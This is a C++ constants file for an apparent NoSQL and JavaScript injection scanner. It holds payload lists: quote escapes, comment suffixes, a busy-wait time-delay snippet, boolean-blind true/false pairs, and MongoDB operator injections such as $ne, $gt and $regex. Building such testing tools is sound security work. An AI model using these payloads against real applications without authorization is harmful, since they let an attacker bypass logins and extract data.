#include "Constants.h"

namespace Constants {
const double AnomalySimilarityThreshold = 85.0;

const std::vector<std::string> Escapes = {"'", "\"", "`", ""};

const std::vector<std::string> Suffixes = {" //", " /*"};

const std::vector<std::string> TimeDelays = {
    " || (function(){{ var d = new Date().getTime(); while(new "
    "Date().getTime() < d + {}){{}} return true; }})()"};

const std::vector<std::pair<std::string, std::string>> BooleanBlinds = {
    {" || false", " || true"},
    {" || 1==2", " || 1==1"},
    {" || 'a'=='b'", " || 'a'=='a'"},
    {" || 1==='1'", " || 1=='1'"},
    {" || typeof 1 === 'string'", " || typeof 1 === 'number'"},
    {" || (function(){throw new Error();})()", " || true"},
    {" || nonexistent_variable_123", " || true"},
    {" || (function(){var a = null; return a.b;})()", " || true"}};

const std::vector<std::string> OperatorInjections = {
    R"({"$ne": null})", R"({"$ne": ""})", R"({"$gt": ""})",
    R"({"$regex": ".*"})",
    R"({"$nin": []})", R"({"$nin": [""]})",
    R"({"$type": 2})"
};
} // namespace Constants
